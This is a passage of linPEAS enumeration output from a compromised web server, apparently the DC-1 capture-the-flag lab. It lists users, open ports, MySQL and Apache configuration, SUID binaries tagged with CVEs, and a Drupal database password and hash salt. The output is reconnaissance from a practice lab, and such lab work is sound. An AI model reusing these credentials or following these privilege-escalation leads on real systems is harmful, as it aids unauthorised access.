/var/run/rpcbind\.sock
└─\(Read Write\)

╔══════════╣ D\-Bus config files
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus)


╔══════════╣ D\-Bus Service Objects list
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus)

busctl Not Found


╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
DC\-1
127\.0\.0\.1	localhost
127\.0\.1\.1	DC\-1

::1     localhost ip6\-localhost ip6\-loopback
ff02::1 ip6\-allnodes
ff02::2 ip6\-allrouters
nameserver 192\.168\.127\.254

╔══════════╣ Interfaces
default		0\.0\.0\.0
loopback	127\.0\.0\.0
link\-local	169\.254\.0\.0

eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:85:d3  
inet addr:192\.168\.127\.193  Bcast:192\.168\.127\.255  Mask:255\.255\.255\.0
inet6 addr: fe80::250:56ff:febf:85d3/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:275638 errors:0 dropped:0 overruns:0 frame:0
TX packets:395069 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000 
RX bytes:26238072 \(25\.0 MiB\)  TX bytes:348864403 \(332\.7 MiB\)

lo        Link encap:Local Loopback  
inet addr:127\.0\.0\.1  Mask:255\.0\.0\.0
inet6 addr: ::1/128 Scope:Host
UP LOOPBACK RUNNING  MTU:16436  Metric:1
RX packets:2416 errors:0 dropped:0 overruns:0 frame:0
TX packets:2416 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0 
RX bytes:239184 \(233\.5 KiB\)  TX bytes:239184 \(233\.5 KiB\)


╔══════════╣ Active Ports
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports)

tcp        0      0 0\.0\.0\.0:22              0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 127\.0\.0\.1:25            0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 0\.0\.0\.0:37701           0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 127\.0\.0\.1:3306          0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 0\.0\.0\.0:111             0\.0\.0\.0:\*               LISTEN      \-               
tcp6       0      0 :::22                   :::\*                    LISTEN      \-               
tcp6       0      0 ::1:25                  :::\*                    LISTEN      \-               
tcp6       0      0 :::45295                :::\*                    LISTEN      \-               
tcp6       0      0 :::111                  :::\*                    LISTEN      \-               
tcp6       0      0 :::80                   :::\*                    LISTEN      \-               

╔══════════╣ Can I sniff with tcpdump?
No



╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
╚═══════════════════╝
╔══════════╣ My user
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#users](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#users)

uid=33\(www\-data\) gid=33\(www\-data\) groups=33\(www\-data\)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo \-l', /etc/sudoers, and /etc/sudoers\.d
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid)


╔══════════╣ Checking sudo tokens
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens)

ptrace protection is enabled \(\)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2](#https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2)


╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
backup:x:34:34:backup:/var/backups:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
games:x:5:60:games:/usr/games:/bin/sh
gnats:x:41:41:Gnats Bug\-Reporting System \(admin\):/var/lib/gnats:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www\-data:x:33:33:www\-data:/var/www:/bin/sh

╔══════════╣ All users \& groups
uid=0\(root\) gid=0\(root\) groups=0\(root\)
uid=1\(daemon\[0m\) gid=1\(daemon\[0m\) groups=1\(daemon\[0m\)
uid=10\(uucp\) gid=10\(uucp\) groups=10\(uucp\)
uid=100\(libuuid\) gid=101\(libuuid\) groups=101\(libuuid\)
uid=1001\(flag4\) gid=1001\(flag4\) groups=1001\(flag4\)
uid=101\(Debian\-exim\) gid=104\(Debian\-exim\) groups=104\(Debian\-exim\)
uid=102\(statd\) gid=65534\(nogroup\) groups=65534\(nogroup\)
uid=103\(messagebus\) gid=107\(messagebus\) groups=107\(messagebus\)
uid=104\(sshd\) gid=65534\(nogroup\) groups=65534\(nogroup\)
uid=105\(mysql\) gid=109\(mysql\) groups=109\(mysql\)
uid=13\(proxy\) gid=13\(proxy\) groups=13\(proxy\)
uid=2\(bin\) gid=2\(bin\) groups=2\(bin\)
uid=3\(sys\) gid=3\(sys\) groups=3\(sys\)
uid=33\(www\-data\) gid=33\(www\-data\) groups=33\(www\-data\)
uid=34\(backup\) gid=34\(backup\) groups=34\(backup\)
uid=38\(list\) gid=38\(list\) groups=38\(list\)
uid=39\(irc\) gid=39\(irc\) groups=39\(irc\)
uid=4\(sync\) gid=65534\(nogroup\) groups=65534\(nogroup\)
uid=41\(gnats\) gid=41\(gnats\) groups=41\(gnats\)
uid=5\(games\) gid=60\(games\) groups=60\(games\)
uid=6\(man\) gid=12\(man\) groups=12\(man\)
uid=65534\(nobody\) gid=65534\(nogroup\) groups=65534\(nogroup\)
uid=7\(lp\) gid=7\(lp\) groups=7\(lp\)
uid=8\(mail\) gid=8\(mail\) groups=8\(mail\)
uid=9\(news\) gid=9\(news\) groups=9\(news\)

╔══════════╣ Login now
05:08:01 up  1:37,  0 users,  load average: 9\.18, 8\.83, 9\.82
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Tue Mar 29 00:34:33 2022 \- Tue Mar 29 22:26:56 2022  \(21:52\)     0\.0\.0\.0
reboot   system boot  Tue Mar 29 00:31:08 2022 \- Tue Mar 29 00:32:25 2022  \(00:01\)     0\.0\.0\.0
root     tty1         Thu Feb 28 12:10:51 2019 \- down                      \(00:00\)     0\.0\.0\.0
root     tty1         Thu Feb 28 12:10:25 2019 \- Thu Feb 28 12:10:43 2019  \(00:00\)     0\.0\.0\.0
reboot   system boot  Thu Feb 28 12:10:13 2019 \- Thu Feb 28 12:11:16 2019  \(00:01\)     0\.0\.0\.0
support  pts/0        Tue Feb 19 22:57:25 2019 \- Tue Feb 19 23:51:06 2019  \(00:53\)     192\.168\.0\.100
root     tty1         Tue Feb 19 22:56:36 2019 \- down                      \(00:55\)     0\.0\.0\.0
reboot   system boot  Tue Feb 19 22:56:17 2019 \- Tue Feb 19 23:51:58 2019  \(00:55\)     0\.0\.0\.0

wtmp begins Tue Feb 19 22:56:17 2019

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Wed Mar 30 00:31:45 \+1000 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password \(I can't do it\.\.\.\)

╔══════════╣ Do not forget to execute 'sudo \-l' without password or with valid password \(if you know it\)\!\!



╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/gcc
/usr/bin/make
/bin/nc
/bin/nc\.traditional
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2\.7
/usr/bin/wget
/usr/bin/xterm

╔══════════╣ Installed Compilers
ii  checkpolicy                        2\.1\.8\-2                                 i386         SELinux policy compiler
ii  gcc                                4:4\.7\.2\-1                               i386         GNU C compiler
ii  gcc\-4\.7                            4\.7\.2\-5                                 i386         GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14\.14 Distrib 5\.5\.60, for debian\-linux\-gnu \(i686\) using readline 6\.2

═╣ MySQL connection using default root/root \.\.\.\.\.\.\.\.\.\.\. No
═╣ MySQL connection using root/toor \.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\. No
═╣ MySQL connection using root/NOPASS \.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\. No

╔══════════╣ Searching mysql credentials and exec
Potential file containing credentials:
\-rwxr\-xr\-x 1 root root 5437 Apr 19  2018 /etc/init\.d/mysql
#\!/bin/bash
### BEGIN INIT INFO
# Provides:          mysql
# Required\-Start:    $remote\_fs $syslog
# Required\-Stop:     $remote\_fs $syslog
# Should\-Start:      $network $time
# Should\-Stop:       $network $time
# Default\-Start:     2 3 4 5
# Default\-Stop:      0 1 6
# Short\-Description: Start and stop the mysql database server daemon
# Description:       Controls the main MySQL database server daemon "mysqld"
#                    and its wrapper script "mysqld\_safe"\.
### END INIT INFO
set \-e
set \-u
$\{DEBIAN\_SCRIPT\_DEBUG:\+ set \-v \-x\}
test \-x /usr/bin/mysqld\_safe || exit 0
\. /lib/lsb/init\-functions
SELF=$\(cd $\(dirname $0\); pwd \-P\)/$\(basename $0\)
CONF=/etc/mysql/my\.cnf
MYADMIN="/usr/bin/mysqladmin \-\-defaults\-file=/etc/mysql/debian\.cnf"
# priority can be overriden and "\-s" adds output to stderr
ERR\_LOGGER="logger \-p daemon\.err \-t /etc/init\.d/mysql \-i"
# Safeguard \(relative paths, core dumps\.\.\)
cd /
umask 077
# mysqladmin likes to read /root/\.my\.cnf\. This is usually not what I want
# as many admins e\.g\. only store a password without a username there and
# so break my scripts\.
export HOME=/etc/mysql/
## Fetch a particular option from mysql's invocation\.
# Usage: void mysqld\_get\_param option
mysqld\_get\_param\(\) \{
/usr/sbin/mysqld \-\-print\-defaults \\
| tr " " "\\n" \\
| grep \-\- "\-\-$1" \\
| tail \-n 1 \\
| cut \-d= \-f2
## Do some sanity checks before even trying to start mysqld\.
sanity\_checks\(\) \{
# check for config file
if \[ \! \-r /etc/mysql/my\.cnf \]; then
log\_warning\_msg "$0: WARNING: /etc/mysql/my\.cnf cannot be read\. See README\.Debian\.gz"
echo                "WARNING: /etc/mysql/my\.cnf cannot be read\. See README\.Debian\.gz" | $ERR\_LOGGER
fi
# check for diskspace shortage
datadir=\`mysqld\_get\_param datadir\`
if LC\_ALL=C BLOCKSIZE= df \-\-portability $datadir/\. | tail \-n 1 | awk '\{ exit \($4\>4096\) \}'; then
log\_failure\_msg "$0: ERROR: The partition with $datadir is too full\!"
echo                "ERROR: The partition with $datadir is too full\!" | $ERR\_LOGGER
exit 1
fi
## Checks if there is a server running and if so if it is accessible\.
# check\_alive insists on a pingable server
# check\_dead also fails if there is a lost mysqld in the process list
# Usage: boolean mysqld\_status \[check\_alive|check\_dead\] \[warn|nowarn\]
mysqld\_status \(\) \{
ping\_output=\`$MYADMIN ping 2\>\&1\`; ping\_alive=$\(\( \! $? \)\)
ps\_alive=0
pidfile=\`mysqld\_get\_param pid\-file\`
if \[ \-f "$pidfile" \] \&\& ps \`cat $pidfile\` \>/dev/null 2\>\&1; then ps\_alive=1; fi

if \[ "$1" = "check\_alive"  \-a  $ping\_alive = 1 \] ||
\[ "$1" = "check\_dead"   \-a  $ping\_alive = 0  \-a  $ps\_alive = 0 \]; then
return 0 # EXIT\_SUCCESS
else
if \[ "$2" = "warn" \]; then
echo \-e "$ps\_alive processes alive and '$MYADMIN ping' resulted in\\n$ping\_output\\n" | $ERR\_LOGGER \-p daemon\.debug
return 1 # EXIT\_FAILURE
fi
# main\(\)
case "$\{1:\-''\}" in
'start'\)
sanity\_checks;
# Start daemon
log\_daemon\_msg "Starting MySQL database server" "mysqld"
if mysqld\_status check\_alive nowarn; then
log\_progress\_msg "already running"
log\_end\_msg 0
else
# Could be removed during boot
test \-e /var/run/mysqld || install \-m 755 \-o mysql \-g root \-d /var/run/mysqld
# Start MySQL\! 
/usr/bin/mysqld\_safe \> /dev/null 2\>\&1 \&
# 6s was reported in #352070 to be too few when using ndbcluster
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14; do
sleep 1
if mysqld\_status check\_alive nowarn ; then break; fi
log\_progress\_msg "\."
done
if mysqld\_status check\_alive warn; then
log\_end\_msg 0
# Now start mysqlcheck or whatever the admin wants\.
output=$\(/etc/mysql/debian\-start\)
\[ \-n "$output" \] \&\& log\_action\_msg "$output"
else
log\_end\_msg 1
log\_failure\_msg "Please take a look at the syslog"
fi
'stop'\)
# \* As a passwordless mysqladmin \(e\.g\. via ~/\.my\.cnf\) must be possible
# at least for cron, we can rely on it here, too\. \(although we have 
# to specify it explicit as e\.g\. sudo environments points to the normal
# users home and not /root\)
log\_daemon\_msg "Stopping MySQL database server" "mysqld"
if \! mysqld\_status check\_dead nowarn; then
set \+e
shutdown\_out=\`$MYADMIN shutdown 2\>\&1\`; r=$?
set \-e
if \[ "$r" \-ne 0 \]; then
log\_end\_msg 1
\[ "$VERBOSE" \!= "no" \] \&\& log\_failure\_msg "Error: $shutdown\_out"
log\_daemon\_msg "Killing MySQL database server by signal" "mysqld"
killall \-15 mysqld
server\_down=
for i in 1 2 3 4 5 6 7 8 9 10; do
sleep 1
if mysqld\_status check\_dead nowarn; then server\_down=1; break; fi
done
if test \-z "$server\_down"; then killall \-9 mysqld; fi
fi
fi
if \! mysqld\_status check\_dead warn; then
log\_end\_msg 1
log\_failure\_msg "Please stop MySQL manually and read /usr/share/doc/mysql\-server\-5\.5/README\.Debian\.gz\!"
exit \-1
else
log\_end\_msg 0
fi
'restart'\)
set \+e; $SELF stop; set \-e
$SELF start 
'reload'|'force\-reload'\)
log\_daemon\_msg "Reloading MySQL database server" "mysqld"
$MYADMIN reload
log\_end\_msg 0
'status'\)
if mysqld\_status check\_alive nowarn; then
log\_action\_msg "$\($MYADMIN version\)"
else
log\_action\_msg "MySQL is stopped\."
exit 3
;;
\*\)
echo "Usage: $SELF start|stop|restart|reload|force\-reload|status"
exit 1
esac
From '/etc/mysql/my\.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my\.cnf
\[client\]
port		= 3306
socket		= /var/run/mysqld/mysqld\.sock
\[mysqld\_safe\]
socket		= /var/run/mysqld/mysqld\.sock
nice		= 0
\[mysqld\]
user		= mysql
pid\-file	= /var/run/mysqld/mysqld\.pid
socket		= /var/run/mysqld/mysqld\.sock
port		= 3306
basedir		= /usr
datadir		= /var/lib/mysql
tmpdir		= /tmp
lc\-messages\-dir	= /usr/share/mysql
skip\-external\-locking
bind\-address		= 127\.0\.0\.1
key\_buffer		= 16M
max\_allowed\_packet	= 16M
thread\_stack		= 192K
thread\_cache\_size       = 8
myisam\-recover         = BACKUP
query\_cache\_limit	= 1M
query\_cache\_size        = 16M
expire\_logs\_days	= 10
max\_binlog\_size         = 100M
\[mysqldump\]
quick
quote\-names
max\_allowed\_packet	= 16M
\[mysql\]
\[isamchk\]
key\_buffer		= 16M
\!includedir /etc/mysql/conf\.d/

╔══════════╣ Analyzing MariaDB Files \(limit 70\)

\-rw\-\-\-\-\-\-\- 1 root root 333 Feb 19  2019 /etc/mysql/debian\.cnf

╔══════════╣ Analyzing Apache\-Nginx Files \(limit 70\)
Apache version: Server version: Apache/2\.2\.22 \(Debian\)
Server built:   May 30 2018 12:49:05
httpd Not Found

Nginx version: nginx Not Found

══╣ PHP exec extensions
drwxr\-xr\-x 2 root root 4096 Feb 19  2019 /etc/apache2/sites\-enabled
drwxr\-xr\-x 2 root root 4096 Feb 19  2019 /etc/apache2/sites\-enabled
lrwxrwxrwx 1 root root 26 Feb 19  2019 /etc/apache2/sites\-enabled/000\-default \-\> \.\./sites\-available/default
\<VirtualHost \*:80\>
ServerAdmin webmaster@localhost
DocumentRoot /var/www
\<Directory /\>
Options FollowSymLinks
AllowOverride None
\</Directory\>
\<Directory /var/www/\>
Options Indexes FollowSymLinks MultiViews
AllowOverride all
Order allow,deny
allow from all
\</Directory\>
ScriptAlias /cgi\-bin/ /usr/lib/cgi\-bin/
\<Directory "/usr/lib/cgi\-bin"\>
AllowOverride None
Options \+ExecCGI \-MultiViews \+SymLinksIfOwnerMatch
Order allow,deny
Allow from all
\</Directory\>
ErrorLog $\{APACHE\_LOG\_DIR\}/error\.log
LogLevel warn
CustomLog $\{APACHE\_LOG\_DIR\}/access\.log combined
\</VirtualHost\>



\-rw\-r\-\-r\-\- 1 root root 64340 May 10  2018 /etc/php5/apache2/php\.ini
allow\_url\_fopen = On
allow\_url\_include = Off
odbc\.allow\_persistent = On
ibase\.allow\_persistent = 1
mysql\.allow\_local\_infile = On
mysql\.allow\_persistent = On
mysqli\.allow\_persistent = On
pgsql\.allow\_persistent = On
sybct\.allow\_persistent = On
mssql\.allow\_persistent = On
\-rw\-r\-\-r\-\- 1 root root 64017 May 10  2018 /etc/php5/cli/php\.ini
allow\_url\_fopen = On
allow\_url\_include = Off
odbc\.allow\_persistent = On
ibase\.allow\_persistent = 1
mysql\.allow\_local\_infile = On
mysql\.allow\_persistent = On
mysqli\.allow\_persistent = On
pgsql\.allow\_persistent = On
sybct\.allow\_persistent = On
mssql\.allow\_persistent = On

╔══════════╣ Analyzing Drupal Files \(limit 70\)
\-r\-\-r\-\-r\-\- 1 www\-data www\-data 15989 Feb 19  2019 /var/www/sites/default/settings\.php
'database' =\> 'drupaldb',
'username' =\> 'dbuser',
'password' =\> 'R0ck3t',
'host' =\> 'localhost',
'port' =\> '',
'driver' =\> 'mysql',
'prefix' =\> '',
\*   $drupal\_hash\_salt = file\_get\_contents\('/home/example/salt\.txt'\);
$drupal\_hash\_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';

╔══════════╣ Analyzing Ldap Files \(limit 70\)
The password hash is from the \{SSHA\} to 'structural'
drwxr\-xr\-x 2 root root 4096 Feb 19  2019 /etc/ldap

drwxr\-xr\-x 2 root root 4096 Feb 19  2019 /usr/share/php5/ldap


╔══════════╣ Searching ssl/ssh files
Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found\!
/etc/ImageMagick/mime\.xml
/usr/sbin/exim4
/usr/sbin/mysqld

══╣ Some home ssh config file was found
/usr/share/doc/openssh\-client/examples/sshd\_config
AuthorizedKeysFile	\.ssh/authorized\_keys
Subsystem	sftp	/usr/libexec/sftp\-server

══╣ /etc/hosts\.allow file found, trying to read the rules:
/etc/hosts\.allow


Searching inside /etc/ssh/ssh\_config for interesting info
Host \*
SendEnv LANG LC\_\*
HashKnownHosts yes
GSSAPIAuthentication yes
GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files \(limit 70\)
drwxr\-xr\-x 2 root root 4096 Mar 29 23:44 /etc/pam\.d
\-rw\-r\-\-r\-\- 1 root root 1462 Apr 15  2016 /etc/pam\.d/sshd
auth       required     pam\_env\.so # \[1\]
auth       required     pam\_env\.so envfile=/etc/default/locale




╔══════════╣ Analyzing Keyring Files \(limit 70\)
drwxr\-xr\-x 2 root root 4096 Feb 19  2019 /usr/share/keyrings




╔══════════╣ Analyzing Backup Manager Files \(limit 70\)

\-rw\-r\-\-r\-\- 1 www\-data www\-data 270 Nov 21  2013 /var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-no\-password\-token\.database\.php
\-rw\-r\-\-r\-\- 1 www\-data www\-data 1114 Nov 21  2013 /var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-password\-token\.database\.php
'pass',
'pass' =\> '$S$DAK00p3Dkojkf4O/UizYxenguXnjv',

╔══════════╣ Searching uncommon passwd files \(splunk\)
passwd file: /etc/pam\.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash\-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP\-GPG Files \(limit 70\)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

\-rw\-\-\-\-\-\-\- 1 root root 1200 Feb 19  2019 /etc/apt/trustdb\.gpg
\-rw\-\-\-\-\-\-\- 1 root root 0 Feb 19  2019 /etc/apt/trusted\.gpg
\-rw\-r\-\-r\-\- 1 root root 5138 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-jessie\-automatic\.gpg
\-rw\-r\-\-r\-\- 1 root root 5147 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-jessie\-security\-automatic\.gpg
\-rw\-r\-\-r\-\- 1 root root 2775 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-jessie\-stable\.gpg
\-rw\-r\-\-r\-\- 1 root root 4084 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-squeeze\-automatic\.gpg
\-rw\-r\-\-r\-\- 1 root root 2853 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-squeeze\-stable\.gpg
\-rw\-r\-\-r\-\- 1 root root 3780 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-wheezy\-automatic\.gpg
\-rw\-r\-\-r\-\- 1 root root 2851 Jan  2  2015 /etc/apt/trusted\.gpg\.d/debian\-archive\-wheezy\-stable\.gpg
\-rw\-r\-\-r\-\- 1 root root 26628 Jan  2  2015 /usr/share/keyrings/debian\-archive\-keyring\.gpg
\-rw\-r\-\-r\-\- 1 root root 10601 Jan  2  2015 /usr/share/keyrings/debian\-archive\-removed\-keys\.gpg
\-rw\-r\-\-r\-\- 1 root root 2373 Jun 17  2017 /var/lib/apt/lists/archive\.debian\.org\_debian\_dists\_wheezy\_Release\.gpg
\-\-\-\-\-BEGIN PGP SIGNATURE\-\-\-\-\-
Version: GnuPG v1
iQIcBAABCAAGBQJZRO8MAAoJEItIrWJGklVTnboQAKSHzEe9nE3TNwZP5kus7/p1
WCxaSKCB4wv/cL\+80A7mepINdyN30TrIKKqVpEy1NIeSUdEJ\+KBqEw22ryAldgDH
Nlws/JBaOZG5Pa8KoaYiuSs5m3g9GgBO7vspByTjHgivEiurzuO/\+Ky2Y4x8xlPO
\+beTosKx6K9rcEJgYnEyeTRTHvASAP2bA/QyifhUKDS7Bcg03w1p9F1xloA\+F/yK
MTC0FlmQyRiJ2Kra5LKeHTf2QoT7EGTNsRhdhPE9fVJQWjvhQzza1HJcskAjoFGk
9cdRz1JyxF4Z97YBy1Z1E7EVWK0j9O8ERclE7K657YM/siu2vpXnibE7EoOxYYnI
WSUzTyxrggu4zwLaT6W6qrxEMSUIrCwgdUz1a/IVpdbiivbmXL/wLj1L2ynMflzM
uRCDjv\+qPJIX4nWEOmWx0BbtTe33NTlkFTzRuGArwFrrS6ZzgX10JOfVd/zFIGX\+
N0PQX2ZE/nz80Va6Utvz3bS7gJ3VN\+pN7vcwMd44pJbkEvB3phkGyrVW//xrttOB
b\+LQucIT/JAB0TGPdKf7OyKDa2/WKhcpYz/1jaRFI/tQ/P6wnFUgFkO8iaE3dJLC
fTs0VdHIW0ZtlZ\+O9TPGQBi8HxmlvJItnZekZHRT0qtTxUgoHHqBXTxIF\+qg7vYr
ivNZnhw\+0LOmGQ7NiI1ViQIcBAABCAAGBQJZRO8MAAoJEHY40EQrkNAQnboP/2o5
m0A70Uquelk1EcdankZ9lPokoAAJLFYbAcswUGm\+eOwHN/ypsfyNocz0zRi8NeX0
5RaaPR/YrsBP\+lUv/Iw4wGTojUsS8M7K6/Isddcwv7NMuSfGmVDH8qFPFe5HUZsC
vEexm/2SdlDywUb4Rpw7gFsyCZqh7Bb\+5SZ3WTqAflzUdqSTjVkuWyhEAhcSKWqc
TpoQjP1j3Ticq7jB70J1V4mxR2wJbDAUpr2DgafCnZnbL8p0YuJuY8qBl9O94kP4
eLqqmCLUlUU5dz5tStd1fFlH0OK/7h\+Y9WnQYDVxI\+8UmhOfTMzc82KgyVklSjcF
icgXkrIJesBwpmIUC5dzgY\+LkqVInUCt7D0\+TC3BEStkFqRssYjZ3t1RmAq/rRHA
9fgwBO/KAYexSHicYXCwgsiPuZ5jVu0VYKRLS0lxQ3bCKut\+5IgI6LuhYbEikJ\+j
ZgmmjSmygYNfwkOHwGJlW12ppGY\+hAmO2VleBYJHhdyodcLdy9gHJneGSmwIycBb
iKTLZ1K6YNEsXw1TEj4ZkjQx6Pxv/I7\+\+KzB8hLfWzMcCEan4S8PQRphpnV1cbRD
Nf/WyyMdKu6KrL2TlFxYcieH2LBNHQwHmtm9OV8V/0Gy/s\+9cw9WqIM6pwxTuR0\+
3hMe5zYKvX5lqQZVke\+kYFKg4YuFEg2Mc2IJ3XH5
=PK8a
\-\-\-\-\-END PGP SIGNATURE\-\-\-\-\-
\-\-\-\-\-BEGIN PGP SIGNATURE\-\-\-\-\-
Version: GnuPG v1
iQIcBAABCAAGBQJZRPMgAAoJEG\+yocJl/7dkRuwP/2BBNrpQOeaBvv/DhVW17psX
yHws8OUfbQoY0u/CLCF7g64bTzddTVEzvzHMO7yiLE\+ynWgNfdJIWixcU1KgZA73
tjxUxFFDfs\+0Q6bmK9h\+fL6sf5gHV4bCZ16lKzrFpYtnhXlmJnyr9kYQCPouQSD9
H08eL4bCHbYKPXPnZ5d9L2dOR2netXdESw7aGdhs6EaD\+f9T3vsc1h6iYiJN2qsv
mPFamXmUANfn4QMjGtsuEYmKpaNdJzOjtXWlwmLD79LVp6w4xf1htEwExjiMyGj3
C2bqYdyJFCLH8v9AW\+9CskJqOqob8u2LXP3\+iEQ2Fju4x4/2uwxLZVNVXVNdxrnc
eD7RExFVhLpdpilJL71EjOoZQ25fwd9YKB3vlS5VcPSAkziIIYXZZP8xDL9pbiPN
iNJpyXtBtVAo25Lgn2KOGsLqtSnT/d9iG2JrXxmjIL4rWu72Ey41P0LDjknNqZBc
1vRYnnuQaofvuBORM8/6N9cxmg1Bt9bPggiNqZrqOvqvqyfyIVU1/RBkVxZ6UUpc
qUGyC/zyGkm86IiXNkPmy8\+YBLCixVc1lEq5mFHXxfYXM/eWD4B4yaE63T6ICXin
5u80WQwKroR1u1\+ZWeFyrrqSIQdop/BNzB6uPCyVkQV5sONtQAty8vLsFT1umqDw
9RLdsczczUj0xtFuPRJ\+
=PcDo
\-\-\-\-\-END PGP SIGNATURE\-\-\-\-\-



╔══════════╣ Analyzing Postfix Files \(limit 70\)
\-rw\-r\-\-r\-\- 1 root root 696 Jun 18  2012 /usr/share/bash\-completion/completions/postfix


╔══════════╣ Analyzing Interesting logs Files \(limit 70\)


╔══════════╣ Analyzing Windows Files \(limit 70\)






















\-rw\-r\-\-r\-\- 1 root root 3504 Apr 19  2018 /etc/mysql/my\.cnf
























\-rw\-r\-\-r\-\- 1 www\-data www\-data 2178 Nov 21  2013 /var/www/web\.config



╔══════════╣ Analyzing Other Interesting Files \(limit 70\)
\-rw\-r\-\-r\-\- 1 root root 3392 Sep 26  2014 /etc/skel/\.bashrc
\-rw\-r\-\-r\-\- 1 flag4 flag4 3392 Feb 19  2019 /home/flag4/\.bashrc





\-rw\-r\-\-r\-\- 1 root root 675 Sep 26  2014 /etc/skel/\.profile
\-rw\-r\-\-r\-\- 1 flag4 flag4 675 Feb 19  2019 /home/flag4/\.profile






╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
╚═══════════════════╝
╔══════════╣ SUID \- Check easy privesc, exploits and write perms
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid)

strace Not Found
\-rwsr\-xr\-x 1 root root 87K Dec 10  2012 /bin/mount  \-\-\-\>  Apple\_Mac\_OSX\(Lion\)\_Kernel\_xnu\-1699\.32\.7\_except\_xnu\-1699\.24\.8
\-rwsr\-xr\-x 1 root root 31K Apr 13  2011 /bin/ping
\-rwsr\-xr\-x 1 root root 35K Feb 27  2017 /bin/su
\-rwsr\-xr\-x 1 root root 35K Apr 13  2011 /bin/ping6
\-rwsr\-xr\-x 1 root root 67K Dec 10  2012 /bin/umount  \-\-\-\>  BSD/Linux\(08\-1996\)
\-rwsr\-sr\-x 1 daemon daemon 50K Oct  4  2014 /usr/bin/at  \-\-\-\>  RTru64\_UNIX\_4\.0g\(CVE\-2002\-1614\)
\-rwsr\-xr\-x 1 root root 36K Feb 27  2017 /usr/bin/chsh
